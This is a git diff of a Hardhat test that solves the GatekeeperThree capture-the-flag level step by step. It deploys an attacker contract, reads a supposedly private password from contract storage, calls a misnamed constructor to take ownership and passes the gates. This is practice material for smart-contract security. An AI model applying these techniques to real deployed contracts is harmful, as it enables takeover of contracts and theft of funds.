@@ -3,45 +3,47 @@ import { ethers } from "hardhat";
 
 describe("GatekeeperThree", async function () {
 
-  it("Should complete the function with no error", async function () {
+  it("Should has the attacker as entrant", async function () {
+    //setup+
     const [deployer, attacker] = await ethers.getSigners()
     const GatekeeperThree = await ethers.getContractFactory("GatekeeperThree");
     const gatekeeperThree = await GatekeeperThree.deploy();
     await gatekeeperThree.deployed();
+    //setup-
 
+    //1.Deploy attacker
     const GatekeeperThreeAttacker = await ethers.getContractFactory("GatekeeperThreeAttacker");
     const gatekeeperThreeAttacker = await GatekeeperThreeAttacker.connect(attacker).deploy(gatekeeperThree.address);
 
     await gatekeeperThreeAttacker.deployed();
 
+
+    //2.Create SimpleTrick contract
     await gatekeeperThree.connect(attacker).createTrick()
 
+    //3.Get address
     const simpleTrickAddr = await gatekeeperThree.trick()
 
-    // const simpleTrick = await ethers.getContractAt("SimpleTrick", simpleTrickAddr)
+    //4.Get password
     const password = await ethers.provider.getStorageAt(simpleTrickAddr, 2)
     expect(await gatekeeperThree.allow_enterance()).to.be.eq(false)
 
+    //5.Turn allow_entrance to true
     await gatekeeperThree.connect(attacker).getAllowance(password)
 
     expect(await gatekeeperThree.allow_enterance()).to.be.eq(true)
 
-    //transferimos para pasar el tercer gate
+    //6.Send ether for gate 3
     await attacker.sendTransaction({ to: gatekeeperThree.address, value: ethers.utils.parseEther("0.0011") })
-    console.log(await gatekeeperThree.entrant())
+
+    //7.Make gatekeeperThreeAttacker owner
     await gatekeeperThreeAttacker.callConstruct0r();
 
+    //8.Call enter through the attacker
     await gatekeeperThreeAttacker.callEnter()
     const entrant = await gatekeeperThree.entrant()
-    expect(entrant).to.be.eq(attacker.address)
 
+    expect(entrant).to.be.eq(attacker.address)
   });
 
 });
-
-
-// sendTransaction({
-//   from: '0xD4CE7BF9548faa57d2bA7ae0e343fAE478960aCb',
-//   to: '0x978fc9DF8cac472C40B605A939c7DF19D680d4c0',
-//   value: '01100000000000000',
-// })
